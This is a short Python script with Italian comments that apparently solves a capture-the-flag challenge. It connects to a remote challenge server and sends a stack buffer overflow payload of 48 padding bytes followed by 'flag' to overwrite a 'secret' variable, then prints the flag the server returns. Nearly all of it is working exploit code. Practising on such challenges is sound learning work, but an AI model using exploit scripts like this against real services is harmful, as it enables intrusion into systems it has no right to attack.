#! usr/bin/python3

import socket
import time

# Configurazione del server
host = "thekidofarcrania.com"
port = 35235

# Il payload basato sull'analisi
# 48 byte di padding (32 buff + 16 padding)
# + "flag" che sovrascrive 'secret'
payload = b'A' * 48 + b'flag\n'

def run_exploit():
    try:
        # Apriamo la connessione
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((host, port))
            print("[+] Connesso al server...")
            
            # Riceviamo il messaggio iniziale e la visualizzazione dello stack
            time.sleep(1) # Aspettiamo un secondo per il buffering
            print(s.recv(4096).decode(errors='ignore'))
            
            # Inviamo il colpo
            print(f"[+] Inviando payload: {payload}")
            s.sendall(payload)
            
            # Riceviamo la risposta (La flag!)
            time.sleep(1)
            risposta = s.recv(4096).decode(errors='ignore')
            print(risposta)
            
    except Exception as e:
        print(f"[-] Errore: {e}")

if __name__ == "__main__":
    run_exploit()